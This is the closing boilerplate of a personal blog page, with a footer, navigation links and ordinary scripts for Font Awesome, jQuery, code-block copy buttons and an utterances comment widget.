        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
